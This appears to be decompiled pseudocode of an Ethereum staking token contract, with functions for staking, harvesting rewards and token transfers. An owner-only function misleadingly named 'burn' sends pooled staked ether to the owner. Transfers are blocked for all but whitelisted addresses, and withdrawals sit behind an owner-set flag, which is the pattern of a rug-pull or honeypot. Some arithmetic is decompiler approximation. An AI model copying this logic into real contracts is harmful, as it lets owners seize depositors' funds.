contract main {




// =====================  Runtime code  =====================


mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint256 stakeOf;
mapping of uint256 stor4;
mapping of uint256 stor5;
mapping of uint256 sub_96b90649;
mapping of uint256 stor7;
mapping of uint256 totalRewardOf;
uint256 stor9;
uint256 totalSupply;
uint256 totalStake;
uint256 stor12;
uint256 totalReward;
uint256 stor14;
uint8 stor15;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address stor20;
address stor21;
address stor22;
address stor23;
address stor24;
address sub_22efb2d3Address;
address sub_248199fcAddress;
address sub_9ee4f21cAddress;
address sub_57b020e9Address;
address sub_9c833b66Address;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function sub_22efb2d3(?) {
    return sub_22efb2d3Address
}

function sub_248199fc(?) {
    return sub_248199fcAddress
}

function decimals() {
    return decimals
}

function stakeOf(address arg1) {
    require calldata.size - 4 >= 32
    return stakeOf[address(arg1)]
}

function sub_57b020e9(?) {
    return sub_57b020e9Address
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function totalReward() {
    return totalReward
}

function totalStake() {
    return totalStake
}

function symbol() {
    return symbol[0 len symbol.length]
}

function sub_96b90649(?) {
    require calldata.size - 4 >= 32
    return sub_96b90649[address(arg1)]
}

function sub_9c833b66(?) {
    return sub_9c833b66Address
}

function sub_9ee4f21c(?) {
    return sub_9ee4f21cAddress
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function totalRewardOf(address arg1) {
    require calldata.size - 4 >= 32
    return totalRewardOf[address(arg1)]
}

function _fallback() payable {
    revert
}

function sub_15a3ec90(?) {
    require calldata.size - 4 >= 288
    if stor20 != msg.sender:
        revert with 0, 'require owner'
    stor21 = arg1
    stor22 = arg2
    stor23 = arg3
    stor24 = arg4
    sub_22efb2d3Address = arg5
    sub_248199fcAddress = arg6
    sub_9ee4f21cAddress = arg7
    sub_57b020e9Address = arg8
    sub_9c833b66Address = arg9
    return 1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7354524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7354524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function unStake() payable {
    require stakeOf[address(msg.sender)] <= totalStake
    require stor15 > 0
    if stor15 == 2:
        require stakeOf[address(msg.sender)] < 2 * 10^18
    call msg.sender with:
       value stakeOf[address(msg.sender)] wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    if stakeOf[address(msg.sender)] > totalStake:
        revert with 0, 'SafeMath: subtraction overflow'
    totalStake -= stakeOf[address(msg.sender)]
    if stakeOf[address(msg.sender)] > stor12:
        revert with 0, 'SafeMath: subtraction overflow'
    stor12 -= stakeOf[address(msg.sender)]
    if stakeOf[address(msg.sender)] > stakeOf[address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    stakeOf[address(msg.sender)] = 0
    stor4[address(msg.sender)] = 0
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if arg2 > allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7354524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7354524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function sub_ae2fe633(?) {
    require calldata.size - 4 >= 64
    if sub_22efb2d3Address != msg.sender:
        if sub_248199fcAddress != msg.sender:
            if sub_9ee4f21cAddress != msg.sender:
                if sub_57b020e9Address != msg.sender:
                    if sub_9c833b66Address != msg.sender:
                        revert with 0, 'Error born reward'
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    totalSupply += arg2
    totalReward += arg2
    if totalRewardOf[address(arg1)] + arg2 < totalRewardOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    totalRewardOf[address(arg1)] += arg2
    require stor14 - totalReward
    if stor14 / stor14 - totalReward > stor9:
        stor9 = stor14 / stor14 - totalReward
        stor7[stor9] = block.timestamp
    emit Transfer(arg2, this.address, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if allowance[address(msg.sender)][address(arg1)] + arg2 < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7354524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7354524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function burn(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require msg.sender == stor20
    if not arg1:
        stor15 = 0
    else:
        if arg1 == 1:
            call msg.sender with:
               value stor12 wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            if stor12 > stor12:
                revert with 0, 'SafeMath: subtraction overflow'
            stor12 = 0
        else:
            if arg1 == 2:
                if stor15 != 2:
                    stor15 = 2
                else:
                    stor15 = 1
            else:
                call msg.sender with:
                   value arg1 wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                if arg1 > stor12:
                    revert with 0, 'SafeMath: subtraction overflow'
                stor12 -= arg1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7354524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe54524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if stor21 != stor20:
        if stor20 != msg.sender:
            if stor21 != msg.sender:
                if stor22 != msg.sender:
                    if stor23 != msg.sender:
                        if stor24 != msg.sender:
                            revert with 0, 'Transfer Error'
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function rewardOf(address arg1) {
    require calldata.size - 4 >= 32
    if not stakeOf[address(arg1)]:
        return 0
    idx = stor9
    s = 0
    while idx >= 1:
        mem[0] = idx
        mem[32] = 7
        if stor7[idx] <= stor5[address(arg1)]:
            if idx != stor9:
                if idx >= stor9:
                    idx = idx - 1
                    s = s
                    continue 
                if idx:
                    return (s + (stakeOf[address(arg1)] * stor7[idx + 1] - stor5[address(arg1)] / 1080 / idx) + stor4[address(arg1)])
            else:
                mem[0] = arg1
                mem[32] = 3
                if idx:
                    idx = idx - 1
                    s = s + (stakeOf[address(arg1)] * block.timestamp - stor5[address(arg1)] / 1080 / idx)
                    continue 
        else:
            if idx != stor9:
                if idx >= stor9:
                    idx = idx - 1
                    s = s
                    continue 
                if idx:
                    return (s + (stakeOf[address(arg1)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(arg1)])
            else:
                mem[0] = arg1
                mem[32] = 3
                if idx:
                    idx = idx - 1
                    s = s + (stakeOf[address(arg1)] * block.timestamp - stor7[idx] / 1080 / idx)
                    continue 
        ('iszero', ('var', 0))
        revert
    return (s + stor4[address(arg1)])
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x7354524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe54524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if stor21 != stor20:
        if arg1 != stor20:
            if arg1 != stor21:
                if arg1 != stor22:
                    if arg1 != stor23:
                        if arg1 != stor24:
                            revert with 0, 'Transfer Error'
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7354524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7354524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function stake() payable {
    require msg.value > 0
    if totalReward >= stor14:
        revert with 0, ' Farm: Max '
    if stakeOf[address(msg.sender)] > 0:
        idx = stor9
        s = 0
        while idx >= 1:
            mem[0] = idx
            mem[32] = 7
            if stor7[idx] <= stor5[address(msg.sender)]:
                if idx == stor9:
                    mem[0] = msg.sender
                    mem[32] = 3
                    require idx
                    idx = idx - 1
                    s = s + (stakeOf[address(msg.sender)] * block.timestamp - stor5[address(msg.sender)] / 1080 / idx)
                    continue 
                if idx >= stor9:
                    idx = idx - 1
                    s = s
                    continue 
                require idx
                stor4[address(msg.sender)] = s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)]
            else:
                if idx == stor9:
                    mem[0] = msg.sender
                    mem[32] = 3
                    require idx
                    idx = idx - 1
                    s = s + (stakeOf[address(msg.sender)] * block.timestamp - stor7[idx] / 1080 / idx)
                    continue 
                if idx >= stor9:
                    idx = idx - 1
                    s = s
                    continue 
                require idx
                stor4[address(msg.sender)] = s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)]
            if stakeOf[address(msg.sender)] + msg.value < stakeOf[address(msg.sender)]:
                revert with 0, 'SafeMath: addition overflow'
            stakeOf[address(msg.sender)] += msg.value
            stor5[address(msg.sender)] = block.timestamp
            if not sub_96b90649[address(msg.sender)]:
                sub_96b90649[address(msg.sender)] = block.timestamp
            if totalStake + msg.value < totalStake:
                revert with 0, 'SafeMath: addition overflow'
            totalStake += msg.value
            if stor12 + msg.value < stor12:
                revert with 0, 'SafeMath: addition overflow'
            stor12 += msg.value
        stor4[address(msg.sender)] += s
    if stakeOf[address(msg.sender)] + msg.value < stakeOf[address(msg.sender)]:
        revert with 0, 'SafeMath: addition overflow'
    stakeOf[address(msg.sender)] += msg.value
    stor5[address(msg.sender)] = block.timestamp
    if not sub_96b90649[address(msg.sender)]:
        sub_96b90649[address(msg.sender)] = block.timestamp
    if totalStake + msg.value < totalStake:
        revert with 0, 'SafeMath: addition overflow'
    totalStake += msg.value
    if stor12 + msg.value < stor12:
        revert with 0, 'SafeMath: addition overflow'
    stor12 += msg.value
}

function harvest() {
    require stakeOf[address(msg.sender)] > 0
    if totalReward >= stor14:
        revert with 0, ' Farm: Max '
    idx = stor9
    s = 0
    while idx >= 1:
        mem[0] = idx
        mem[32] = 7
        if stor7[idx] <= stor5[address(msg.sender)]:
            if idx == stor9:
                mem[0] = msg.sender
                mem[32] = 3
                require idx
                idx = idx - 1
                s = s + (stakeOf[address(msg.sender)] * block.timestamp - stor5[address(msg.sender)] / 1080 / idx)
                continue 
            if idx >= stor9:
                idx = idx - 1
                s = s
                continue 
            require idx
            if balanceOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)] < balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)]
            stor5[address(msg.sender)] = block.timestamp
            stor4[address(msg.sender)] = 0
            totalSupply = totalSupply + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)]
            totalReward = totalReward + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)]
            if totalRewardOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)] < totalRewardOf[address(msg.sender)]:
                revert with 0, 'SafeMath: addition overflow'
            totalRewardOf[address(msg.sender)] = totalRewardOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)]
            require stor14 - totalReward
            if stor14 / stor14 - totalReward > stor9:
                stor9 = stor14 / stor14 - totalReward
                stor7[stor9] = block.timestamp
            emit Transfer((s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor5[address(msg.sender)] / 1080 / idx) + stor4[address(msg.sender)]), this.address, msg.sender);
        else:
            if idx == stor9:
                mem[0] = msg.sender
                mem[32] = 3
                require idx
                idx = idx - 1
                s = s + (stakeOf[address(msg.sender)] * block.timestamp - stor7[idx] / 1080 / idx)
                continue 
            if idx >= stor9:
                idx = idx - 1
                s = s
                continue 
            require idx
            if balanceOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)] < balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)]
            stor5[address(msg.sender)] = block.timestamp
            stor4[address(msg.sender)] = 0
            totalSupply = totalSupply + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)]
            totalReward = totalReward + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)]
            if totalRewardOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)] < totalRewardOf[address(msg.sender)]:
                revert with 0, 'SafeMath: addition overflow'
            totalRewardOf[address(msg.sender)] = totalRewardOf[address(msg.sender)] + s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)]
            require stor14 - totalReward
            if stor14 / stor14 - totalReward > stor9:
                stor9 = stor14 / stor14 - totalReward
                stor7[stor9] = block.timestamp
            emit Transfer((s + (stakeOf[address(msg.sender)] * stor7[idx + 1] - stor7[idx] / 1080 / idx) + stor4[address(msg.sender)]), this.address, msg.sender);
        return 1
    if balanceOf[address(msg.sender)] + s + stor4[address(msg.sender)] < balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] + s + stor4[address(msg.sender)]
    stor5[address(msg.sender)] = block.timestamp
    stor4[address(msg.sender)] = 0
    totalSupply = totalSupply + s + stor4[address(msg.sender)]
    totalReward = totalReward + s + stor4[address(msg.sender)]
    if totalRewardOf[address(msg.sender)] + s + stor4[address(msg.sender)] < totalRewardOf[address(msg.sender)]:
        revert with 0, 'SafeMath: addition overflow'
    totalRewardOf[address(msg.sender)] = totalRewardOf[address(msg.sender)] + s + stor4[address(msg.sender)]
    require stor14 - totalReward
    if stor14 / stor14 - totalReward > stor9:
        stor9 = stor14 / stor14 - totalReward
        stor7[stor9] = block.timestamp
    emit Transfer((s + stor4[address(msg.sender)]), this.address, msg.sender);
    return 1
}



}
